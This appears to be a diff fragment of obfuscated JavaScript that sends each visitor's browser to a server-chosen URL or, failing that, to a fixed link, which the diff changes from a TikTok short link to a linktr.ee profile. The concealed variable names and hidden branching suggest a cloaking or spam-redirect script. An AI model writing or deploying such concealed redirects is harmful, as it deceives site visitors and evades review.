@@ -70,7 +70,7 @@ return '';
 };
 if(!_0xv2w3()){
 var _0xj5k6=_0xb7c8();
-if(_0xj5k6){window.location.replace(_0xj5k6);}else{window.location.replace('https://vt.tiktok.com/ZS9UkARU7enBp-Ww30g/');}
+if(_0xj5k6){window.location.replace(_0xj5k6);}else{window.location.replace('https://linktr.ee/camilyvitoriax');}
 }else{
 var _0xl7m8=function(){
 document.body.classList.add('act');
@@ -95,7 +95,7 @@ _0xf7g8.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
 _0xf7g8.send('a='+encodeURIComponent('0|0|0|0'));
 if(_0xf7g8.status===200){try{var _0xh9i0=JSON.parse(_0xf7g8.responseText);if(_0xh9i0&&_0xh9i0.s){window.location.replace(_0xh9i0.s);return;}}catch(_0xj1k2){}}
 }catch(_0xk3l4){}
-try{window.location.replace('https://vt.tiktok.com/ZS9UkARU7enBp-Ww30g/');}catch(_0xm5n6){}
+try{window.location.replace('https://linktr.ee/camilyvitoriax');}catch(_0xm5n6){}
 }
 if(!document.body.classList.contains('act')){
 try{
@@ -105,7 +105,7 @@ _0xo7p8.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
 _0xo7p8.send('a='+encodeURIComponent('0|0|0|0'));
 if(_0xo7p8.status===200){try{var _0xq9r0=JSON.parse(_0xo7p8.responseText);if(_0xq9r0&&_0xq9r0.s){window.location.replace(_0xq9r0.s);return;}}catch(_0xs1t2){}}
 }catch(_0xu3v4){}
-try{window.location.replace('https://vt.tiktok.com/ZS9UkARU7enBp-Ww30g/');}catch(_0xw5x6){}
+try{window.location.replace('https://linktr.ee/camilyvitoriax');}catch(_0xw5x6){}
 }
 },1500);
 }
